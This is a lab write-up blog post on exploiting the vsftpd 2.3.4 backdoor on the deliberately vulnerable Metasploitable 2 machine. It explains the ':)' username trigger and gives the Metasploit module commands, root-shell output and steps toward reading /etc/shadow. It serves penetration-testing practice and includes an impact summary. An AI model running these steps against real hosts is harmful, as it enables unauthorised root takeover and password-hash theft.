---
title: "Metasploitable 2 — Exploiting the vsftpd 2.3.4 Backdoor (Root Shell)"
date: 2025-11-19
categories: [Pentesting, Metasploitable]
tags: [ftp, vsftpd, metasploit, rce, exploitation]
layout: post
---

# Metasploitable 2 — Exploiting the vsftpd 2.3.4 Backdoor (Root Shell)

During the Nmap scan, one of the highest-risk findings was the FTP service running **vsftpd 2.3.4**.  
This version is widely known for containing a **malicious backdoor** inserted into the official distribution after the upstream server was compromised.

Triggering this backdoor gives an **unauthenticated root shell**, making it one of the most reliable attack paths on Metasploitable 2.

This post documents the exploitation process, verification of full system compromise, and why this vulnerability is so critical.

---

## Overview of the vsftpd 2.3.4 Backdoor

Unlike normal vulnerabilities, this issue comes from a **trojanized version of vsftpd** that was distributed publicly.  
When a username containing the substring `:)` is submitted, the backdoor activates and opens a root shell on TCP port **6200**.

Key characteristics of this backdoor:

- No authentication required  
- No brute force or guessing  
- Always works as long as the vulnerable service is running  
- Spawns a shell running as **root**  

This makes it a textbook example of a malicious supply-chain compromise.

---

## Confirming Anonymous FTP Access

Before running the exploit, I confirmed that anonymous login was enabled:

![Anonymous FTP Login](/assets/img/metasploitable2/fig_ftp_anon.png)

The server immediately accepted an anonymous session:

```text
230 Login successful.
```


This does not trigger the backdoor, but demonstrates poor service configuration.

---

## Locating the Exploit Module in Metasploit

Metasploit includes a dedicated module for this vulnerability. Searching for it:

```bash
search vsftpd
```

Produces:

The correct module is:

```bash
exploit/unix/ftp/vsftpd_234_backdoor
```

---

## Running the Exploit

Once the module was selected, I pointed it at the target and executed it:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.50.63
run
```

Metasploit reported:

```bash
[+] Backdoor service has been spawned, handling...
[+] Command shell session opened
```

This confirms the backdoor executed successfully and a shell was opened on port 6200.

---

## Verifying Root-Level Shell Access

To verify privilege level, I ran:

```bash
id
```

The output confirmed:
```bash
uid=0(root) gid=0(root)
```

This means full root access was granted immediately.

---

### Reading System Files

With root privileges, I accessed sensitive files to confirm complete system compromise.

### /etc/passwd

This file lists system accounts and login shells. My output:

The presence of system accounts such as root, daemon, bin, and msfadmin further confirms unrestricted access.

### /etc/shadow

The /etc/shadow file contains hashed passwords and is only readable by root:

Being able to read /etc/shadow is definitive proof of full system compromise and would allow offline password cracking.

---

## Why This Attack Is So Effective

This vulnerability is:
- A supply-chain backdoor
- Not dependent on weak credentials
- Not impacted by network firewalls (other than port 21/6200)
- Always reliable on Metasploitable 2
- Executed with root privileges

This makes it one of the most straightforward and powerful exploits found during enumeration.

---

## Security Impact (Summary)

If this were a production environment, the consequences would be severe:
- Full root compromise
- Installation of persistent backdoors
- Ability to modify or destroy any file
- Credential extraction through /etc/shadow
- Lateral movement into internal systems

FTP should never be exposed to the internet, and vsftpd should always be run from trusted sources.

---

## Next Steps

With the vsftpd backdoor exploited and a root shell obtained, the next phase is continuing enumeration and preparing further attacks.

In the next post, I will document how I performed SMTP VRFY user enumeration to obtain valid system usernames for later privilege escalation and brute-force attacks.

---

~ Rex